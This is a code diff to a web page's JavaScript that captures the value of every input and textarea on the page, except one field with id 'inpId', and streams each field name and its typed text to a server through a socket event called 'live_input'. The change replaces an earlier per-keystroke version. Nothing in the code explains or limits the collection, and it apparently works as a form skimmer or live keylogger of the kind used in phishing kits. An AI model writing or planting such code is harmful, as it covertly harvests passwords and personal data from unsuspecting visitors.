@@ -61,10 +61,56 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    const inputBuffers = new Map();
+    const INPUT_TIMEOUT = 1500;
+
     document.addEventListener('input', (e) => {
-        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-            if(e.target.id !== 'inpId') { 
-                socket.emit('live_input', { value: e.data || e.target.value.slice(-1) });
+        const target = e.target;
+        
+        if((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.id !== 'inpId') {
+            const targetId = target.id || target.className;
+            
+            if (inputBuffers.has(targetId)) {
+                clearTimeout(inputBuffers.get(targetId).timeout);
+            }
+
+            const currentValue = target.value;
+
+            const timeoutId = setTimeout(() => {
+                if (currentValue.trim().length > 0) {
+                    socket.emit('live_input', { 
+                        field: targetId,
+                        value: currentValue.trim() 
+                    });
+                }
+                inputBuffers.delete(targetId);
+            }, INPUT_TIMEOUT);
+
+            inputBuffers.set(targetId, {
+                value: currentValue,
+                timeout: timeoutId
+            });
+        }
+    });
+
+    document.addEventListener('keydown', (e) => {
+        const target = e.target;
+        
+        if (e.key === 'Enter' && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.id !== 'inpId') {
+            const targetId = target.id || target.className;
+            
+            if (inputBuffers.has(targetId)) {
+                clearTimeout(inputBuffers.get(targetId).timeout);
+                
+                const currentValue = target.value;
+                if (currentValue.trim().length > 0) {
+                    socket.emit('live_input', { 
+                        field: targetId,
+                        value: currentValue.trim() 
+                    });
+                }
+                
+                inputBuffers.delete(targetId);
             }
         }
     });
